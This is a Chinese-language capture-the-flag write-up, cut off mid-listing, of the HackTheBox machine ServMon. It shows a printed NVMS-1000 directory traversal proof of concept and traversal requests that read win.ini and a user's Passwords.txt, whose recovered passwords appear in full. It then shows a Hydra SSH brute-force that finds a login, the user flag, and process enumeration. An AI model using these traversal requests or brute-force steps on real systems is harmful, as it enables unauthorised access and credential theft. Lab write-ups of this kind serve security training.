<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbmap -H <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span><br><br>    ________  ___      ___  _______   ___      ___       __         _______<br>   /<span class="hljs-string">&quot;       )|&quot;</span>  \    /<span class="hljs-string">&quot;  ||   _  &quot;</span>\ |<span class="hljs-string">&quot;  \    /&quot;</span>  |     /<span class="hljs-string">&quot;&quot;</span>\       |   __ <span class="hljs-string">&quot;\</span><br><span class="hljs-string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span><br><span class="hljs-string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span><br><span class="hljs-string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span><br><span class="hljs-string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \<br>  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)<br> -----------------------------------------------------------------------------<br>     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com<br>                     https:<span class="hljs-comment">//github.com/ShawnDEvans/smbmap</span><br><br>[*] Detected <span class="hljs-number">1</span> hosts serving SMB<br>[*] Established <span class="hljs-number">0</span> SMB session(s)<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -L <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span> -N<br>session setup failed: NT_STATUS_ACCESS_DENIED<br></code></pre></td></tr></table></figure>

<p>7、查看网站的首页信息</p>
<p><code>http://10.10.10.184/Pages/login.htm</code></p>
<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<p>8、搜索相关漏洞信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit NVMS     <br>----------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                               |  Path<br>----------------------------------------------------------------------------- ---------------------------------<br>NVMS <span class="hljs-number">1000</span> - Directory Traversal                                              | hardware/webapps/<span class="hljs-number">47774.</span>txt<br>OpenVms <span class="hljs-number">5.3</span>/<span class="hljs-number">6.2</span>/<span class="hljs-number">7.</span>x - UCX POP Server Arbitrary File Modification             | multiple/local/<span class="hljs-number">21856.</span>txt<br>OpenVms <span class="hljs-number">8.3</span> Finger Service - Stack Buffer Overflow                           | multiple/dos/<span class="hljs-number">32193.</span>txt<br>TVT NVMS <span class="hljs-number">1000</span> - Directory Traversal                                          | hardware/webapps/<span class="hljs-number">48311.</span>py<br>----------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit -m <span class="hljs-number">47774</span><br>  Exploit: NVMS <span class="hljs-number">1000</span> - Directory Traversal<br>      URL: https:<span class="hljs-comment">//www.exploit-db.com/exploits/47774</span><br>     Path: /usr/share/exploitdb/exploits/hardware/webapps/<span class="hljs-number">47774.</span>txt<br>    Codes: N/A<br> Verified: False<br>File Type: Unicode text, UTF<span class="hljs-number">-8</span> text<br>Copied to: /home/kali/Desktop/<span class="hljs-number">47774.</span>txt<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat <span class="hljs-number">47774.</span>txt        <br># Title: NVMS<span class="hljs-number">-1000</span> - Directory Traversal<br># Date: <span class="hljs-number">2019</span><span class="hljs-number">-12</span><span class="hljs-number">-12</span><br># Author: Numan Türle<br># Vendor Homepage: http:<span class="hljs-comment">//en.tvt.net.cn/</span><br># Version : N/A<br># Software Link : http:<span class="hljs-comment">//en.tvt.net.cn/products/188.html</span><br><br>POC<br>---------<br><br>GET /../../../../../../../../../../../../windows/win.ini HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">12.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Response</span><br><span class="hljs-comment">---------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">; for 16-bit app support</span><br><span class="hljs-comment">[fonts]</span><br><span class="hljs-comment">[extensions]</span><br><span class="hljs-comment">[mci extensions]</span><br><span class="hljs-comment">[files]</span><br><span class="hljs-comment">[Mail]</span><br><span class="hljs-comment">MAPI=1 </span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>

<p>9、这里可以看到这个系统存在任意文件读取的漏洞，我们尝试验证下是否存在</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">GET /../../../../../../../../../../../../windows/win.ini HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux aarch64; rv:<span class="hljs-number">109.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">115.0</span><br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Referer: http://10.10.10.184/Pages/login.htm</span><br><span class="hljs-comment">Cookie: dataPort=6063; lang_type=0x0804%24zh-cn</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">HTTP/1.1 200 OK</span><br><span class="hljs-comment">Content-type: </span><br><span class="hljs-comment">Content-Length: 92</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">AuthInfo: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">; for 16-bit app support</span><br><span class="hljs-comment">[fonts]</span><br><span class="hljs-comment">[extensions]</span><br><span class="hljs-comment">[mci extensions]</span><br><span class="hljs-comment">[files]</span><br><span class="hljs-comment">[Mail]</span><br><span class="hljs-comment">MAPI=1</span><br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<p>10、那就获取下用户首页的密码信息吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux aarch64; rv:<span class="hljs-number">109.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">115.0</span><br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Referer: http://10.10.10.184/Pages/login.htm</span><br><span class="hljs-comment">Cookie: dataPort=6063; lang_type=0x0804%24zh-cn</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">HTTP/1.1 200 OK</span><br><span class="hljs-comment">Content-type: text/plain</span><br><span class="hljs-comment">Content-Length: 156</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">AuthInfo: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">1nsp3ctTh3Way2Mars!</span><br><span class="hljs-comment">Th3r34r3To0M4nyTrait0r5!</span><br><span class="hljs-comment">B3WithM30r4ga1n5tMe</span><br><span class="hljs-comment">L1k3B1gBut7s@W0rk</span><br><span class="hljs-comment">0nly7h3y0unGWi11F0l10w</span><br><span class="hljs-comment">IfH3s4b0Utg0t0H1sH0me</span><br><span class="hljs-comment">Gr4etN3w5w17hMySk1Pa5$</span><br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<p>11、这里我们构造下账号密码破解包，并使用hydra进行暴力破解尝试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat Users.txt        <br>Nathan<br>Nadine<br>                                                                                                               <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat Passwords.txt <br><span class="hljs-number">1</span>nsp3ctTh3Way2Mars!<br>Th3r34r3To0M4nyTrait0r5!<br>B3WithM30r4ga1n5tMe<br>L1k3B1gBut7s@W0rk<br><span class="hljs-number">0</span>nly7h3y0unGWi11F0l10w<br>IfH3s4b0Utg0t0H1sH0me<br>Gr4etN3w5w17hMySk1Pa5$<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ hydra -L Users.txt -P Passwords.txt ssh:<span class="hljs-comment">//10.10.10.184</span><br>Hydra v9<span class="hljs-number">.5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use in military or secret service organizations, or <span class="hljs-keyword">for</span> illegal <span class="hljs-title function_">purposes</span> <span class="hljs-params">(this is non-binding, these *** ignore laws and ethics anyway)</span>.<br><br><span class="hljs-title function_">Hydra</span> <span class="hljs-params">(https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) starting at 2024-03-17 19:34:14</span></span><br><span class="hljs-params">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="hljs-number">4</span></span><br><span class="hljs-params">[DATA] max <span class="hljs-number">14</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">14</span> tasks, <span class="hljs-number">14</span> login tries (l:<span class="hljs-number">2</span>/p:<span class="hljs-number">7</span>), ~<span class="hljs-number">1</span> try per task</span><br><span class="hljs-params">[DATA] attacking ssh:<span class="hljs-comment">//10.10.10.184:22/</span></span><br><span class="hljs-params">[<span class="hljs-number">22</span>][ssh] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>   login: Nadine   password: L1k3B1gBut7s@W0rk</span><br><span class="hljs-params"><span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found</span><br><span class="hljs-params">Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) finished at 2024-03-17 19:34:23</span></span><br></code></pre></td></tr></table></figure>

<p>12、通过ssh登录，获取到第一个flag信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh Nadine@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>     <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.184 (10.10.10.184)&#x27;</span> can<span class="hljs-number">&#x27;</span>t be established.<br>ED25519 key fingerprint is SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-keyword">continue</span> <span class="hljs-title function_">connecting</span> <span class="hljs-params">(yes/no/[fingerprint])</span>? yes<br>Warning: Permanently added &#x27;10.10.10.184&#x27; <span class="hljs-params">(ED25519)</span> to the <span class="hljs-built_in">list</span> of known hosts.<br>Nadine@10.10.10.184&#x27;s password:<br>Microsoft Windows [Version 10.0.17763.864]<br><span class="hljs-params">(c)</span> 2018 Microsoft Corporation. All rights reserved.<br><br>nadine@SERVMON C:\Users\Nadine&gt;cd Desktop<br><br>nadine@SERVMON C:\Users\Nadine\Desktop&gt;dir<br> Volume in drive C has no label.<br> Volume Serial Number is 20C1-47A1<br><br> Directory of C:\Users\Nadine\Desktop<br><br>02/28/2022  08:05 PM    &lt;DIR&gt;          .<br>02/28/2022  08:05 PM    &lt;DIR&gt;          ..<br>03/17/2024  03:29 AM                34 user.txt<br>               1 <span class="hljs-title function_">File</span><span class="hljs-params">(s)</span>             34 bytes<br>               2 <span class="hljs-title function_">Dir</span><span class="hljs-params">(s)</span>   6,110,035,968 bytes <span class="hljs-built_in">free</span><br><br>nadine@SERVMON C:\Users\Nadine\Desktop&gt;cat user.txt<br>&#x27;cat&#x27; is not recognized as an internal or external command,<br>operable program or batch file.<br><br>nadine@SERVMON C:\Users\Nadine\Desktop&gt;type user.txt<br>8fb69451ba6ba88fe1b4ae19cce79afa        <br>                                        <br>nadine@SERVMON C:\Users\Nadine\Desktop&gt; <br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>13、开始内网的常规信息枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><code class="hljs c">nadine@SERVMON C:\Users\Nadine\Desktop&gt;<br>nadine@SERVMON C:\Users\Nadine\Desktop&gt;<br>nadine@SERVMON C:\Users\Nadine\Desktop&gt;ps -ano<br><span class="hljs-string">&#x27;ps&#x27;</span> is not recognized as an internal or external command,<br>operable program or batch file.<br><br>nadine@SERVMON C:\Users\Nadine\Desktop&gt;clear<br><span class="hljs-string">&#x27;clear&#x27;</span> is not recognized as an internal or external command,<br>operable program or batch file.<br><br>nadine@SERVMON C:\Users\Nadine\Desktop&gt;powershell<br>Windows PowerShell<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> Microsoft Corporation. All rights reserved.<br><br>PS C:\Users\Nadine\Desktop&gt;<br>PS C:\Users\Nadine\Desktop&gt; ps<br> <br>Handles  <span class="hljs-title function_">NPM</span><span class="hljs-params">(K)</span>    <span class="hljs-title function_">PM</span><span class="hljs-params">(K)</span>      <span class="hljs-title function_">WS</span><span class="hljs-params">(K)</span>     <span class="hljs-title function_">CPU</span><span class="hljs-params">(s)</span>     Id  SI ProcessName<br>-------  ------    -----      -----     ------     --  -- -----------<br>     73       5     2720       4324              5944   1 cmd<br>     77       5     3508       4128       0.03   6756   0 cmd<br>    116       6     1148       4920       0.02   1624   0 conhost<br>    154       9     6640      12596              2420   0 conhost<br>    198      12     7152      18048              5952   1 conhost<br>    482      18     2288       5416               372   0 csrss<br>    325      13     2100       5120               484   1 csrss<br>    361      16     4964      16216              4220   1 ctfmon<br>    254      14     4016      13548              1088   0 dllhost<br>    582      26    23396      50800               968   1 dwm<br>   1413      54    20416      75172              4596   1 explorer<br>     49       6     1496       4536               752   0 fontdrvhost<br>     49       8     4092       9300               760   1 fontdrvhost<br>      0       0       56          8                 0   0 Idle<br>    909      23     5432      14520               628   0 lsass<br>    223      13     3040      10456              3288   0 msdtc<br>    783      85   258040     230376              2464   0 MsMpEng<br>    153      38     4612       7512              3848   0 NisSrv<br>    313      23     5820      18552               804   0 nscp<br>   2525     357   343916     373356              4936   1 NVMS-1000<br>    550      28    72896      81348       0.75   1588   0 powershell<br>      0      12      368      12224                88   0 Registry                                            <br>    294      15     6072      16912              3268   1 RuntimeBroker<br>    149       9     1800       7932              4088   1 RuntimeBroker<br>    225      12     2144      12024              5428   1 RuntimeBroker                                       <br>    673      33    21324      62864              4664   1 SearchUI<br>    529      11     4732       9464               620   0 services<br>    694      28    15120      51844              3972   1 ShellExperienceHost<br>    443      17     4900      24432               960   1 sihost<br>     53       3      500       1196               276   0 smss<br>    471      22     5892      16972              2172   0 spoolsv<br>    118      11     1668       6672              2324   0 sshd<br>    135       9     2256       7220       0.02   5404   0 sshd                                                <br>    128       9     2096       7324              6312   0 sshd<br>    149       9     1724      11860               360   0 svchost<br>    115       7     1320       5400               364   0 svchost<br>    213      12     2052       9828               488   0 svchost<br>     85       5      860       3780               732   0 svchost<br>    384      13    10712      14660               748   0 svchost<br>    827      20     6900      22640               776   0 svchost<br>    819      16     4756      11348               860   0 svchost<br>    243      10     1852       7112               904   0 svchost                                             <br>    143       7     1292       5688               956   0 svchost<br>    272      13     3396      10996              1008   0 svchost<br>    197      15     6284      10488              1052   0 svchost<br>    116      14     2840       6968              1192   0 svchost<br>    180      10     1920       8724              1208   0 svchost<br>    208       9     2036       7508              1256   0 svchost                                             <br>    184       9     1764       7608              1280   0 svchost<br>    341      13     3776      10664              1340   0 svchost<br>    226      13     2680       8076              1360   0 svchost<br>    378      18     4880      14188              1384   0 svchost<br>    236      12     2756      11516              1480   0 svchost<br>    307      10     2388       8420              1488   0 svchost<br>    426       9     2748       8936              1504   0 svchost<br>    152       7     1200       5640              1524   0 svchost<br>    261      13     2636       8000              1544   0 svchost<br>    163       9     1724       7916              1668   0 svchost<br>    315      11     2012       8872              1740   0 svchost<br>    185      11     2104      12004              1784   0 svchost<br>    141       9     1676       6660              1848   0 svchost<br>    233      11     2368       9644              1876   0 svchost<br>    399      32     8128      16524              1936   0 svchost<br>    194      11     1956       8184              1976   0 svchost<br>    167      12     1724       7336              2052   0 svchost<br>    180      22     2488       9900              2208   0 svchost<br>    325      16     4476      12100              2224   0 svchost<br>    393      16    10968      19940              2232   0 svchost<br>    206      11     2264       8416              2260   0 svchost<br>    136       8     1468       6228              2332   0 svchost<br>    128       8     1224       5472              2364   0 svchost<br>    209      12     1804       7492              2412   0 svchost<br>    169      10     2124      13272              2484   0 svchost<br>    465      16     3316      11832              2512   0 svchost<br>    324      18     4844      21512              3428   0 svchost<br>    271      13     3352      14616              3580   1 svchost<br>    201      11     2524      11548              3708   0 svchost<br>    365      18     5568      27328              3780   1 svchost<br>    171       9     1496       7304              4144   0 svchost<br>    166       9     4056      11844              4236   0 svchost<br>    249      14     3036      13788              4348   0 svchost<br>    329      16    13116      15380              6540   0 svchost<br>    114       7     1540       6036              6568   0 svchost<br>    170       9     2996       7768              6620   0 svchost<br>    274      20     7852      12748              6712   0 svchost<br>    168      11     2420      13268              6952   0 svchost<br>   1779       0      192        156                 4   0 System                                              <br>    196      12     3768       9388              2976   1 taskhostw<br>    178      11     2112      11040              3736   1 